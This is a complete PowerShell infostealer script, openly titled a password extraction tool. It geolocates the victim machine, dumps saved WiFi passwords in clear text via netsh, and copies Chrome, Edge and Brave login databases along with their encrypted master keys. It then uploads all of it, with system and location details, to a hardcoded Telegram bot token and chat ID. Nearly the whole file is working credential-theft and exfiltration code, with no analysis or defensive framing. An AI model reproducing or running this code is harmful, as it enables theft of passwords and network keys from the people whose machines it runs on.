# Enhanced Multi-Browser Password Extraction with WiFi Passwords
# Fixed file path handling and improved WiFi data extraction

param(
    [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
    [string]$TelegramChatID = "2047893044"  # Your Chat ID
)

# Function to get public IP information
function Get-PublicIPInfo {
    try {
        Write-Host "Getting public IP information..." -ForegroundColor Yellow
        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
        return @{
            PublicIP = $ipInfo.ip
            Country = $ipInfo.country
            Region = $ipInfo.region
            City = $ipInfo.city
            Org = $ipInfo.org
            Loc = $ipInfo.loc
            Timezone = $ipInfo.timezone
        }
    } catch {
        Write-Host "Failed to get public IP information: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            PublicIP = "Unknown"
            Country = "Unknown"
            Region = "Unknown"
            City = "Unknown"
            Org = "Unknown"
            Loc = "Unknown"
            Timezone = "Unknown"
        }
    }
}

# Function to get detailed system information
function Get-DetailedSystemInfo {
    $computerInfo = Get-ComputerInfo
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
    $biosInfo = Get-WmiObject -Class Win32_BIOS
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
    
    return @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSName = $osInfo.Caption
        OSVersion = $osInfo.Version
        OSBuild = $osInfo.BuildNumber
        BIOSSerial = $biosInfo.SerialNumber
        Processor = $processorInfo.Name
        ProcessorCores = $processorInfo.NumberOfCores
        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
    }
}

# Function to extract detailed WiFi information
function Get-DetailedWiFiInfo {
    Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
    
    $wifiProfiles = @()
    $wifiInterfaces = @()
    
    try {
        # Get WiFi interface information
        $interfaceInfo = netsh wlan show interfaces
        $interfaceDetails = @{}
        $currentInterface = ""
        
        foreach ($line in $interfaceInfo) {
            if ($line -match "^\s*Name\s*:\s*(.+)") {
                $currentInterface = $matches[1].Trim()
                $interfaceDetails[$currentInterface] = @{}
            } elseif ($currentInterface -and $line -match "^\s*([^:]+)\s*:\s*(.+)") {
                $key = $matches[1].Trim()
                $value = $matches[2].Trim()
                $interfaceDetails[$currentInterface][$key] = $value
            }
        }
        
        # Get all WiFi profiles
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_.ToString().Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                # Get detailed WiFi profile information
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $profileDetails = @{}
                
                foreach ($line in $profileInfo) {
                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
                        $key = $matches[1].Trim()
                        $value = $matches[2].Trim()
                        $profileDetails[$key] = $value
                    }
                }
                
                $password = $profileDetails["Key Content"]
                $authentication = $profileDetails["Authentication"]
                $encryption = $profileDetails["Cipher"]
                
                $wifiProfiles += @{
                    SSID = $profile
                    Password = if ($password) { $password } else { "No password" }
                    Authentication = $authentication
                    Encryption = $encryption
                    ConnectionMode = $profileDetails["Connection mode"]
                    SSIDName = $profileDetails["SSID name"]
                    NetworkType = $profileDetails["Network type"]
                    RadioType = $profileDetails["Radio type"]
                    VendorExtension = $profileDetails["Vendor extension"]
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            } catch {
                Write-Host "Error processing WiFi profile $profile : $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        # Get current connected WiFi information
        $currentWifi = netsh wlan show interfaces | Where-Object { $_ -match "SSID" } | ForEach-Object {
            if ($_ -match "SSID\s*:\s*(.+)") {
                $matches[1].Trim()
            }
        }
        
        $wifiData = @{
            Profiles = $wifiProfiles
            Interfaces = $interfaceDetails
            CurrentlyConnected = if ($currentWifi) { $currentWifi } else { "Not connected" }
            TotalProfiles = $wifiProfiles.Count
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        
        return $wifiData
        
    } catch {
        Write-Host "Error extracting WiFi information: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            Profiles = @()
            Interfaces = @{}
            CurrentlyConnected = "Error"
            TotalProfiles = 0
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Error = $_.Exception.Message
        }
    }
}

# Function to send message to Telegram
function Send-TelegramMessage {
    param(
        [string]$Message
    )
    
    try {
        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
        $body = @{
            chat_id = $TelegramChatID
            text = $Message
            parse_mode = "HTML"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
        
        if ($response.ok) {
            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
            return $true
        } else {
            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to send files to Telegram
function Send-TelegramFile {
    param(
        [string]$FilePath,
        [string]$Caption
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            Write-Host "File not found: $FilePath" -ForegroundColor Red
            return $false
        }
        
        # Wait for file to be fully written
        $maxWaitTime = 30
        $waitTime = 0
        while ($waitTime -lt $maxWaitTime) {
            try {
                $file = Get-Item $FilePath
                $fileSize = $file.Length
                if ($fileSize -gt 0) {
                    break
                }
            } catch {}
            Start-Sleep -Seconds 1
            $waitTime++
        }
        
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $TelegramChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"caption`"",
            "",
            $Caption,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileContent,
            "--$boundary--"
        ) -join $LF

        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        
        if ($response.ok) {
            Write-Host "✅ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
            return $true
        } else {
            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to install SQLite3 if needed
function Install-SQLiteIfNeeded {
    try {
        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
        $tempZip = "sqlite-temp.zip"
        
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
        
        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to extract master key from browser's Local State file
function Get-BrowserMasterKey {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName
    )
    
    $localStatePath = Join-Path $BrowserDataPath "Local State"
    
    if (-not (Test-Path $localStatePath)) {
        Write-Host "$BrowserName Local State file not found." -ForegroundColor Yellow
        return $null
    }
    
    try {
        Write-Host "Reading $BrowserName Local State file..." -ForegroundColor Yellow
        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localStateContent.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            Write-Host "No encrypted key found in $BrowserName Local State" -ForegroundColor Yellow
            return $null
        }
        
        Write-Host "Found encrypted master key for $BrowserName" -ForegroundColor Green
        
        # Return the base64 encoded master key for future use
        return @{
            EncryptedKey = $encryptedKey
            KeyLength = ([System.Convert]::FromBase64String($encryptedKey)).Length
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Browser = $BrowserName
        }
    } catch {
        Write-Host "Error extracting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to find all login data files in browser profiles
function Get-BrowserLoginDataFiles {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName
    )
    
    $loginDataFiles = @()
    
    if (-not (Test-Path $BrowserDataPath)) {
        Write-Host "$BrowserName data directory not found: $BrowserDataPath" -ForegroundColor Yellow
        return $loginDataFiles
    }
    
    # Check default profile first
    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
    if (Test-Path $defaultLoginData) {
        $loginDataFiles += @{
            Path = $defaultLoginData
            Profile = "Default"
        }
    }
    
    # Check other profiles
    $profilePatterns = @("Profile *", "Profile*", "User *", "User*")
    foreach ($pattern in $profilePatterns) {
        $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter $pattern -ErrorAction SilentlyContinue
        foreach ($profileDir in $profileDirs) {
            $loginDataPath = Join-Path $profileDir.FullName "Login Data"
            if (Test-Path $loginDataPath) {
                $loginDataFiles += @{
                    Path = $loginDataPath
                    Profile = $profileDir.Name
                }
            }
        }
    }
    
    return $loginDataFiles
}

# Function to extract encrypted passwords from browser
function Get-BrowserEncryptedPasswords {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName,
        [string]$BrowserKey
    )
    
    $loginDataFiles = Get-BrowserLoginDataFiles -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
    
    if ($loginDataFiles.Count -eq 0) {
        Write-Host "No login database files found for $BrowserName." -ForegroundColor Yellow
        return @{
            Summary = @()
            DetailedData = @()
        }
    }
    
    Write-Host "Found $($loginDataFiles.Count) login database(s) for $BrowserName" -ForegroundColor Green
    
    $results = @()
    $encryptedData = @()
    
    foreach ($loginDataFile in $loginDataFiles) {
        $dbPath = $loginDataFile.Path
        $profileName = $loginDataFile.Profile
        
        Write-Host "  Processing profile: $profileName" -ForegroundColor Cyan
        
        try {
            # Copy the database to avoid locking issues
            $tempDbPath = "temp_$($BrowserKey)_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
            Copy-Item $dbPath $tempDbPath -Force
            
            # Export data using SQLite
            $tempCsvPath = "temp_$($BrowserKey)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
            
            if (Test-Path ".\sqlite3.exe") {
                $sqlitePath = ".\sqlite3.exe"
            } else {
                $sqlitePath = "sqlite3"
            }
            
            # Query the database
            $query = @"
SELECT origin_url, username_value, hex(password_value) as password_hex, 
       length(password_value) as password_length
FROM logins;
"@
            & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
            
            if (Test-Path $tempCsvPath) {
                $logins = Import-Csv $tempCsvPath
                Write-Host "    Found $($logins.Count) login entries" -ForegroundColor Green
                
                $counter = 0
                foreach ($login in $logins) {
                    $counter++
                    
                    # Create a unique identifier for this entry
                    $entryId = [System.Guid]::NewGuid().ToString()
                    
                    # Store encrypted data for future decryption
                    $encryptedEntry = @{
                        Id = $entryId
                        Browser = $BrowserName
                        BrowserKey = $BrowserKey
                        Profile = $profileName
                        URL = $login.origin_url
                        Username = $login.username_value
                        HexData = $login.password_hex
                        DataLength = $login.password_length
                        EncryptionVersion = "Unknown"
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                    
                    # Try to detect encryption version
                    if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
                        try {
                            $hexString = $login.password_hex
                            if ($hexString.Length -ge 6) {
                                $prefixBytes = [System.Convert]::ToByte($hexString.Substring(0, 2), 16), 
                                              [System.Convert]::ToByte($hexString.Substring(2, 2), 16),
                                              [System.Convert]::ToByte($hexString.Substring(4, 2), 16)
                                $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
                                
                                if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
                                    $encryptedEntry.EncryptionVersion = $prefix
                                }
                            }
                        } catch {
                            # Ignore detection errors
                        }
                    }
                    
                    $encryptedData += $encryptedEntry
                    
                    # Add to results for CSV
                    $results += [PSCustomObject]@{
                        ID = $entryId
                        Browser = $BrowserName
                        Profile = $profileName
                        URL = $login.origin_url
                        Username = $login.username_value
                        EncryptionVersion = $encryptedEntry.EncryptionVersion
                        DataLength = $login.password_length
                        HexDataPreview = if ($login.password_hex -and $login.password_hex.Length -gt 50) { 
                            $login.password_hex.Substring(0, 50) + "..." 
                        } else { 
                            $login.password_hex 
                        }
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                    
                    # Show progress
                    if ($counter % 10 -eq 0 -and $counter -gt 0) {
                        Write-Host "    Processed $counter entries..." -ForegroundColor Cyan
                    }
                }
                
                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
            }
            
            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
            
        } catch {
            Write-Host "    Error processing $BrowserName profile $($profileName): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    # Return both the summary and detailed encrypted data
    return @{
        Summary = $results
        DetailedData = $encryptedData
    }
}

# Main execution
Write-Host "Enhanced Password Extraction Tool" -ForegroundColor Green
Write-Host "=================================" -ForegroundColor Green

# Get system and location information
$systemInfo = Get-DetailedSystemInfo
$ipInfo = Get-PublicIPInfo
$timestamp = Get-Date -Format "ddMMyyyy"
$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)

# Create file names with the new format
$filePrefix = "$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.Region)_${timestamp}_${fileId}"
$CSVPath = Join-Path $PWD "${filePrefix}_browsers.csv"
$JSONPath = Join-Path $PWD "${filePrefix}_browsers.json"
$WiFiJSONPath = Join-Path $PWD "${filePrefix}_wifi.json"
$WiFiCSVPath = Join-Path $PWD "${filePrefix}_wifi.csv"

Write-Host "Location Info:" -ForegroundColor Yellow
Write-Host "Public IP: $($ipInfo.PublicIP)" -ForegroundColor Cyan
Write-Host "Country: $($ipInfo.Country)" -ForegroundColor Cyan
Write-Host "Region: $($ipInfo.Region)" -ForegroundColor Cyan
Write-Host "City: $($ipInfo.City)" -ForegroundColor Cyan
Write-Host "Files will be saved as:" -ForegroundColor Yellow
Write-Host "Browser CSV: $CSVPath" -ForegroundColor Yellow
Write-Host "Browser JSON: $JSONPath" -ForegroundColor Yellow
Write-Host "WiFi JSON: $WiFiJSONPath" -ForegroundColor Yellow
Write-Host "WiFi CSV: $WiFiCSVPath" -ForegroundColor Yellow
Write-Host "Telegram Chat ID: $TelegramChatID" -ForegroundColor Cyan

# Browser paths configuration
$browsers = @{
    "Chrome" = @{
        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Name = "Google Chrome"
    }
    "Edge" = @{
        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        Name = "Microsoft Edge"
    }
    "Brave" = @{
        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        Name = "Brave Browser"
    }
}

# Send system information to Telegram first
$systemMessage = @"
🖥️ <b>System Information</b>
• <b>Computer:</b> $($systemInfo.ComputerName)
• <b>User:</b> $($systemInfo.UserName)
• <b>OS:</b> $($systemInfo.OSName) ($($systemInfo.OSVersion))
• <b>Processor:</b> $($systemInfo.Processor) ($($systemInfo.ProcessorCores) cores)
• <b>Memory:</b> $($systemInfo.TotalMemoryGB) GB
• <b>Manufacturer:</b> $($systemInfo.SystemManufacturer)
• <b>Model:</b> $($systemInfo.SystemModel)
• <b>BIOS Serial:</b> $($systemInfo.BIOSSerial)
• <b>Local IP:</b> $($systemInfo.LocalIP)
• <b>MAC Address:</b> $($systemInfo.MACAddress)

🌍 <b>Location Information</b>
• <b>Public IP:</b> $($ipInfo.PublicIP)
• <b>Country:</b> $($ipInfo.Country)
• <b>Region:</b> $($ipInfo.Region)
• <b>City:</b> $($ipInfo.City)
• <b>Organization:</b> $($ipInfo.Org)
• <b>Coordinates:</b> $($ipInfo.Loc)
• <b>Timezone:</b> $($ipInfo.Timezone)

⏰ <b>Extraction Started:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

Write-Host "Sending system information to Telegram..." -ForegroundColor Yellow
Send-TelegramMessage -Message $systemMessage | Out-Null

# Extract detailed WiFi information
Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
$wifiData = Get-DetailedWiFiInfo

# Export WiFi data to JSON and CSV
if ($wifiData.Profiles.Count -gt 0) {
    $wifiData | ConvertTo-Json -Depth 10 | Out-File -FilePath $WiFiJSONPath -Encoding UTF8
    Write-Host "Detailed WiFi data exported to: $WiFiJSONPath" -ForegroundColor Green
    
    # Create CSV version
    $wifiData.Profiles | Export-Csv -Path $WiFiCSVPath -NoTypeInformation -Encoding UTF8
    Write-Host "WiFi CSV data exported to: $WiFiCSVPath" -ForegroundColor Green
}

# Install SQLite if needed
if (-not (Test-Path ".\sqlite3.exe")) {
    if (-not (Install-SQLiteIfNeeded)) {
        Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
        exit 1
    }
}

# Extract browser passwords
$allSummaryData = @()
$allDetailedData = @()
$allMasterKeys = @()

# Process each browser
foreach ($browserKey in $browsers.Keys) {
    $browser = $browsers[$browserKey]
    Write-Host "`nProcessing $($browser.Name)..." -ForegroundColor Yellow
    
    # Extract master key information
    $masterKeyInfo = Get-BrowserMasterKey -BrowserDataPath $browser.Path -BrowserName $browser.Name
    if ($masterKeyInfo) {
        $allMasterKeys += $masterKeyInfo
    }
    
    # Extract encrypted passwords
    $extractionResult = Get-BrowserEncryptedPasswords -BrowserDataPath $browser.Path -BrowserName $browser.Name -BrowserKey $browserKey
    $allSummaryData += $extractionResult.Summary
    $allDetailedData += $extractionResult.DetailedData
    
    Write-Host "Finished processing $($browser.Name): $($extractionResult.Summary.Count) entries found" -ForegroundColor Green
}

# Display and export results
if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0) {
    Write-Host "`nSuccessfully extracted data!" -ForegroundColor Green
    
    if ($allSummaryData.Count -gt 0) {
        Write-Host "Browser passwords: $($allSummaryData.Count) entries" -ForegroundColor Green
        
        # Export summary to CSV
        try {
            $allSummaryData | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
            Write-Host "Browser summary exported to: $CSVPath" -ForegroundColor Green
        } catch {
            Write-Host "CSV export failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Export detailed data to JSON
        try {
            $exportData = @{
                Metadata = @{
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    TotalEntries = $allSummaryData.Count
                    OS = $systemInfo.OSName
                    OSVersion = $systemInfo.OSVersion
                    User = $systemInfo.UserName
                    Machine = $systemInfo.ComputerName
                    PublicIP = $ipInfo.PublicIP
                    Country = $ipInfo.Country
                    Region = $ipInfo.Region
                    City = $ipInfo.City
                    Org = $ipInfo.Org
                    Loc = $ipInfo.Loc
                    Timezone = $ipInfo.Timezone
                    SystemName = $systemInfo.ComputerName
                }
                MasterKeys = $allMasterKeys
                EncryptedPasswords = $allDetailedData
            }
            
            $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
            Write-Host "Detailed browser data exported to: $JSONPath" -ForegroundColor Green
            
        } catch {
            Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    if ($wifiData.Profiles.Count -gt 0) {
        Write-Host "WiFi passwords: $($wifiData.Profiles.Count) networks found" -ForegroundColor Green
    }
    
    # Wait to ensure files are fully written
    Write-Host "Waiting for files to be fully written..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    
    # Send files to Telegram
    Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
    
    $filesSent = 0
    $totalFiles = 0
    
    if ($allSummaryData.Count -gt 0) {
        $totalFiles += 2
        $browserCaption = "🌐 Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        if (Send-TelegramFile -FilePath $CSVPath -Caption $browserCaption) { $filesSent++ }
        if (Send-TelegramFile -FilePath $JSONPath -Caption $browserCaption) { $filesSent++ }
    }
    
    if ($wifiData.Profiles.Count -gt 0) {
        $totalFiles += 2
        $wifiCaption = "📶 WiFi Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nNetworks: $($wifiData.Profiles.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        if (Send-TelegramFile -FilePath $WiFiJSONPath -Caption $wifiCaption) { $filesSent++ }
        if (Send-TelegramFile -FilePath $WiFiCSVPath -Caption $wifiCaption) { $filesSent++ }
    }
    
    # Send completion message
    $completionMessage = @"
✅ <b>Extraction Completed Successfully!</b>

🖥️ <b>System:</b> $($systemInfo.ComputerName)
🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
📊 <b>Browser Entries:</b> $($allSummaryData.Count)
📶 <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
📁 <b>Files Sent:</b> $filesSent/$totalFiles
⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
    
    Send-TelegramMessage -Message $completionMessage | Out-Null
    
    if ($filesSent -eq $totalFiles) {
        Write-Host "✅ All files sent to Telegram successfully!" -ForegroundColor Green
    } else {
        Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
    }
    
} else {
    Write-Host "No data found in any browser or WiFi networks." -ForegroundColor Yellow
    $emptyMessage = "❌ No passwords found in any browser or WiFi networks.`nSystem: $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-TelegramMessage -Message $emptyMessage | Out-Null
}

Write-Host "`nEnhanced password extraction completed." -ForegroundColor Green

# Cleanup temporary files
Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force
Write-Host "Temporary files cleaned up." -ForegroundColor Green

# Show final file locations
Write-Host "`nFinal files created:" -ForegroundColor Green
if (Test-Path $CSVPath) {
    Write-Host "Browser CSV: $((Get-Item $CSVPath).FullName)" -ForegroundColor Yellow
}
if (Test-Path $JSONPath) {
    Write-Host "Browser JSON: $((Get-Item $JSONPath).FullName)" -ForegroundColor Yellow
}
if (Test-Path $WiFiJSONPath) {
    Write-Host "WiFi JSON: $((Get-Item $WiFiJSONPath).FullName)" -ForegroundColor Yellow
}
if (Test-Path $WiFiCSVPath) {
    Write-Host "WiFi CSV: $((Get-Item $WiFiCSVPath).FullName)" -ForegroundColor Yellow
}
